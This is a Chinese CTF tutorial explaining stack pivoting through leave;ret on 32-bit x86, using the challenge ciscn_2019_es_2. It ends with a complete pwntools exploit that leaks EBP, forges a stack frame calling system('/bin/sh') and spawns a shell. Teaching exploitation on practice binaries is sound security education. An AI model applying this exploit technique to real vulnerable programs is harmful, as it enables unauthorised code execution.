**这几次打比赛遇到栈迁移的问题了，之前没有搞过类似的问题，所以专门学习了一下并且记录下来**

# 回顾函数调用栈

之前已经数次讲解过函数调用栈的过程。当时我们定义了两个函数分别是caller和callee，其中caller是调用函数，callee是被调函数，那么我们再来回顾一下它们之间到底发生了什么。  
![image.png](https://image.3001.net/images/20211216/1639646863_61bb068f22b6eae906f40.png!small)  
首先在调用函数之前，将callee的参数压入栈中，然后才执行call指令。时刻要记住，esp始终指向栈顶。然后执行call指令，然后就进入到了callee的栈帧中。最开始执行的两条指令是`push
ebp;mov ebp,esp`。首先看`push ebp`  
![image.png](https://image.3001.net/images/20211216/1639647243_61bb080bc4236b2b06879.png!small)  
中间插入的eip就不再赘述。由于使用的push指令，所以栈中的ebp值其实就是此时ebp寄存器中的值，就是为了函数执行到最后pop
ebp的时候恢复到caller的栈帧，然后执行`mov ebp esp`  
![image.png](https://image.3001.net/images/20211216/1639647318_61bb08565148844658941.png!small)  
此时已经组建好了callee的栈帧，接下来就是执行callee中的语句。局部变量的申请将伴随着esp的移动。当callee调用结束以后，将会执行`leave;ret`语句。leave语句本质上相当于`mov
esp,ebp;pop ebp`。首先我们假设callee最后的栈帧是这样的  
![image.png](https://image.3001.net/images/20211216/1639647577_61bb09590b43ec8ad9046.png!small)  
那么首先需要回收栈空间，也就是将ebp的值赋给esp  
![image.png](https://image.3001.net/images/20211216/1639647644_61bb099c4b12d8c6ab59a.png!small)  
然后pop ebp，由于使用了pop指令，所以esp也会随之下降，ebp回到caller的栈底  
![image.png](https://image.3001.net/images/20211216/1639647710_61bb09def2cf2da559b56.png!small)

 **这就是了解栈迁移之前的前置知识，如果这里讲的不是很清楚的话大家可以看一下函数调用栈的完整过程**

# 栈迁移

接下来正式开始讲解栈迁移。首先什么是栈迁移？  
**EBP被称为栈帧寄存器，每一次函数调用都会通过栈帧来对栈内数据进行维护。当我们想办法修改EBP寄存器到其他地方，那么函数的栈空间也就发生了改变。这就叫做栈迁移**
。

我们为什么要使用栈迁移呢？我们在什么情况下使用栈迁移？  
**我们首先要知道栈溢出在什么情况下可以getshell？大多数情况都是我们可输入的字符远远的超出了缓冲区与栈帧之间的距离。但是我们不可能总是这么幸运，我们总能输入很长的字符串，那么如果我们只能输入几个字节，我们又该如何利用？这时我们就可以使用到栈迁移**

那么我们如何去利用栈迁移进行溢出呢？  
**看一下上一节当函数调用结束时的几个指令，就是利用`leave;ret`指令。由于用到了这两个指令，那么我们溢出的时候就需要有这么一个前提：即使我们溢出缓冲区的字节数很少，也需要覆盖到EBP和EIP这两个地方。EBP将决定我们可以将栈空间放在哪里，而ret指令将决定我们调用完函数以后可以干什么**

# 例题

我们来做一道题练练手。[栈迁移](https://files.buuoj.cn/files/3b1f1f64834cb78d6bafc0422ec4fbec/ciscn_2019_es_2)  
首先我们放入ubuntu中，看一下保护  
![image.png](https://image.3001.net/images/20211216/1639654932_61bb2614397b48af74e5d.png!small)  
32位，并且只开了NX保护，然后我们将其放入IDA中  
![image.png](https://image.3001.net/images/20211216/1639654992_61bb26502d81a1383b627.png!small)  
可以发现，确实有栈溢出，但是只多溢出了8个字节，恰好够我们将EBP和EIP覆盖掉。然后我们要有一个思路，确实可以栈溢出，但是应该往哪里溢出？我们有两次写的机会，并且紧跟着后面就是printf，因此我们可以利用这个printf来泄露ebp的数据(因为printf的结束符为'\x00',也就是说当我们填满了s字符串以后，printf还会另外帮我们输出后面的数据直到遇到'\x00')。

![image.png](https://image.3001.net/images/20211216/1639655607_61bb28b7955e1144b863b.png!small)  
泄露出ebp的值以后，我们就可以进行栈迁移了。然后我用上图进行一个模拟，我们先来看一下此时的栈和指针的状况![image.png](https://image.3001.net/images/20211216/1639656686_61bb2ceeccaecd14ff716.png!small)  
然后我们将ebp进行覆盖，覆盖到0x0的位置，eip覆盖为`leave;ret`指令。执行`leave`指令，我们将leave指令分成`mov
esp,ebp;pop ebp`。当执行`mov
esp,ebp`以后![image.png](https://image.3001.net/images/20211216/1639658418_61bb33b250dd6fb9c31b2.png!small)  
当执行完pop以后![image.png](https://image.3001.net/images/20211216/1639658462_61bb33de1fb7742914fc8.png!small)  
由于我们的EIP被覆盖为了`leave;ret`，因此再执行一次leave指令，还是首先执行`mov esp,ebp`。  
![image.png](https://image.3001.net/images/20211216/1639660362_61bb3b4a9d1fea0e73106.png!small)  
然后执行pop指令，由于此时栈内输入的是我们构造的值，因此此时ebp寄存器里存放的其实是垃圾值，但是这里ebp对我们已经没有作用了，因此pop
ebp只是让esp进行了下降。  
![image.png](https://image.3001.net/images/20211216/1639660462_61bb3baeaf0effd6c2952.png!small)  
然后执行ret指令，本质上就是pop
eip。看到了吧，也就是说我们控制了eip。这就是栈迁移最后的结果。由于我们可以有两次输入，因此第一次输入就是要泄露ebp的值，而第二次输入则要考虑如何进行利用。此时可以这样构造缓冲区的空间  
![image.png](https://image.3001.net/images/20211216/1639660642_61bb3c62d65662e446923.png!small)  
首先system是ret将要返回的地址，紧邻其下的是system的返回地址，但是我们不需要进行利用，因此使用字符串进行填充。再往下就是参数，由于是字符串，因此我们应该输入一串地址，这个地址就是/bin/sh字符串的首地址。再往下就存放字符串。

我画了一个图来模拟这个题的栈空间，那么我们回到题目，进行一波调试  
![image.png](https://image.3001.net/images/20211216/1639660917_61bb3d754a1c9c2d15f6c.png!small)  
直接进入vul函数，然后看此时ebp中的值。然后我们继续向下调试  
![image.png](https://image.3001.net/images/20211216/1639661012_61bb3dd46c18bcdb3050d.png!small)  
看此刻缓冲区的地址，距离EBP的偏移为0x38(注意，这里的"距离ebp的偏移"指的是缓冲区的头部距离内存中存放的caller的EBP的值，而不是栈的地址，因为我们有一个泄露EBP的操作，泄露的本来就是caller的EBP，因此当我们构造fake_ebp的时候需要根据caller的EBP来进行偏移)。然后我们使用ROPgadget来看一下leave|ret  
![image.png](https://image.3001.net/images/20211216/1639661330_61bb3f12d23f7664899a1.png!small)  
最后我们来看一下exp

    
    
    from pwn import *
    context.log_level = "debug"
    p = process('/home/wjl/Desktop/ciscn_2019_es_2 (1)' )
    elf = ELF('/home/wjl/Desktop/ciscn_2019_es_2 (1)' )
    p.recvuntil("Welcome, my friend. What's your name?")
    leave_ret = 0x080484b8
    system_addr = elf.plt['system']
    p.send("a"*0x27 + "b")
    p.recvuntil("b")
    ebp_addr = u32(p.recv(4))
    print(hex(ebp_addr))
    new_ebp = ebp_addr - 0x38 
    payload = ("aaaa" + p32(system_addr) +'a'*4+p32(ebp_addr-0x28)+"/bin/sh").ljust(0x28,'\x00')+p32(new_ebp) + p32(leave_ret)
    p.send(payload)
    p.interactive()
    

可能会有人问为什么不能调用程序中自带的system呢？  
![image.png](https://image.3001.net/images/20211216/1639661562_61bb3ffa449bef51feed0.png!small)  
**因为函数的执行要遵守堆栈平衡，函数调用的开始与结束不能改变堆栈环境。但是我们如果调用上图里面的system函数，那么最后回执行leave和ret指令，会破坏我们之前构造好的堆栈环境**

 **总结：我们这次回顾了函数调用栈，并且根据它有了一个新的玩法——栈迁移。并且从是什么、为什么、怎么做三个方面进行讲解。栈溢出花样太多，还是得多做题**

